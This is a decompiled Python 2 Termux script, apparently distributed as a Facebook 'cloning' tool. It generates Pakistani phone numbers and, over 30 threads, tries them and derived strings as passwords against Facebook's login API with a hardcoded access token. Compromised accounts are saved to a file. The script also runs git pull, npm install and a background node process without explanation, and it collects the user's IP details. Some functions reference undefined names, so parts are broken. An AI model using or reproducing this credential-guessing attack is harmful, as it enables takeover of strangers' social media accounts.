# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Mar 20 2021, 14:58:25) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: dg

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
__author__ = 'AHMAD X ZEESHAN'
__copyright = 'All rights reserved . Copyright  ASAD ALI'
os.system('termux-setup-storage')
try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
	print 'Thanks.'
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mAXI.............................99% \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
oks = []
id = []
cpb = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
os.system('git pull')
os.system('clear')
logo = """
\033[1;91m     o      ooooo  oooo ooooo  
\033[1;92m    888       888  88    888  
\033[1;93m   8  88        888      888  
\033[1;94m  8oooo88      88 888    888  
\033[1;95mo88o  o888o o88o  o888o o888o 
\033[1;96m------------------------------------------------------------
\033[1;97m Auther   : AHMAD X ZEESHAN
\033[1;98m GitHub   : https://github.com/ahmad77412
\033[1;99m YouTube  : Tips & Tricks       
  -----------------------------------------------------------------------------------------                                                       
"""
def reg():
    os.system('clear')
    print logo
    print ''
    print '\x1b[1;32;1m Enjoy Free Cloning'
    print ''
    time.sleep(1)
    try:
        to = open('/sdcard/.axi.txt', 'r').read()
    except (KeyError, IOError):
        reg2()

    r = requests.get('https://raw.githubusercontent.com/ahmad77412/axi/main/server.txt').text
    if to in r:
        os.system('cd ..... && npm install')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('cd ..... && node index.js &')
        time.sleep(5)
        ip()
    else:
        os.system('clear')
        print logo
        print '\tApproved Failed'
        print ' \x1b[1;92mYour Id Is Not Approved Already '
        print ' \x1b[1;92mCopy the id and send to admin'
        print ' \x1b[1;92mYour id: ' + to
        raw_input('\x1b[1;93m Press enter to send id')
        os.system('xdg-open https://wa.me/+923458630524')
        reg()


def reg2():
    os.system('clear')
    print logo
    print '\tApproval not detected'
    print ' \x1b[1;92mCopy and press enter ,then WhatsApp to continue'
    id = uuid.uuid4().hex[:50]
    print ' Your id: ' + id
    print ''
    raw_input(' Press enter to go to WhatsApp ')
    os.system('xdg-open https://wa.me/+923458630524')
    sav = open('/sdcard/.axi.txt', 'w')
    sav.write(id)
    sav.close()
    raw_input('\x1b[1;92m Press enter to check Approval ')
    reg()


def ip():
    os.system('clear')
    print logo
    print '\tCollecting device info'
    try:
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        ips = z['query']
        country = z['country']
        regi = z['regionName']
        network = z['isp']
    except:
        pass

    print '\x1b[1;92m Your ip: ' + ips
    time.sleep(1)
    print '\x1b[1;92m Your country: ' + country
    time.sleep(1)
    print '\x1b[1;92m Your region: ' + regi
    time.sleep(1)
    print ' \x1b[1;92mYour network: ' + network
    time.sleep(1)
    print ' Loading ...'
    time.sleep(1)
    log_menu()


def log_menu():
    os.system('clear')
    print logo
    print "\033[1;96m[1]\x1b[1;93m Random number "
    time.sleep(0.05)
    print '\x1b[1;95m[0]\033[1;92m Exit '
    pilih_login()

def pilih_login():
    peak = raw_input("\n\033[1;93mCHOOSE: \033[1;91m")
    if peak =="":
        print "\x1b[1;95mFill In Correctly"
        pilih_login()
    elif peak =="1":
        Zeek()
def Zeek():
    os.system('clear')
    print logo
    print '\x1b[1;93m[1] AXI method ( Best slow )'
    time.sleep(0.05)
    print '\x1b[1;92m[0] \033[1;93m Back'
    time.sleep(0.05)
    action()

def action():
    peak = raw_input('\n\033[1;95mCHOOSE:\033[1;97m')
    if peak =='':
        print '[!] Fill In Correctly'
        action()
    elif peak =="1":              
        os.system("clear")
        print logo2
        print "Put  number of pakistan country Example: 01,02,11,21,32,45"+'\n'
        print ' Enter  code 1 to 49'
        try:
            c = raw_input("\033[1;96mCHOOSE : ")
            k="03"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            blackmafiax()
    elif peak =='0':
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    print 50* '\033[1;91m-'
    xxx = str(len(id))
    jalan ('\033[1;91m Total ids number: '+xxx)
    jalan ('\033[1;93m Code you choose: '+c)
    jalan ("\033[1;95m CP OPEN AFTER 8DAYS 70%")
    jalan ("\033[1;96m TEAM WORK AHMAD X ZEESHAN")
    print 50* '\033[1;92m-'
    def main(arg):
        global cpb,oks
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[Sucessfull-AXI] ' + k + c + user + '  |  ' + pass1                                       
                okb = open('save/cloned.txt', 'a')
                okb.write(k+c+user+pass1+'\n')
                okb.close()
                oks.append(c+user+pass1)
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;93m[Check-Point-AXI] ' + k + c + user + '  |  ' + pass1
                    cps = open('save/cloned.txt', 'a')
                    cps.write(k+c+user+pass1+'\n')
                    cps.close()
                    cpb.append(c+user+pass1)
                else:
                    pass2 = k + c + user
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[Sucessfull-AXI] ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        okb.write(k+c+user+pass2+'\n')
                        okb.close()
                        oks.append(c+user+pass2)
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;93m[Check-Point-AXI] ' + k + c + user + '  |  ' + pass2
                            cps = open('save/cloned.txt', 'a')
                            cps.write(k+c+user+pass2+'\n')
                            cps.close()
                            cpb.append(c+user+pass2)
                        

                                                                                                                                                                                                            
                                                                                                                                                                                                                    
                                                                                                                                                                                                            



        except:
            pass
        
    p = ThreadPool(30)
    p.map(main, id)
    print 50* '\033[1;91m-'
    print 'AXI Process Has Been Completed .............................100%'
    print 'Total OK/CP : '+str(len(oks))+' | '+str(len(cpb))
    print('AXICloned Accounts Has Been Saved : save/cloned.txt')
    jalan("Note : Your AXI (CP)Accounts Open after 8 days")
    print ''
    print """
    
    
    
    

\033[1;91mThanks \033[1;97mUSE My AXITool
"""

    
    raw_input("\n\033[1;92m[\033[1;92mBack\033[1;95m]")
    login() 
          
if __name__ == '__main__':
    reg()
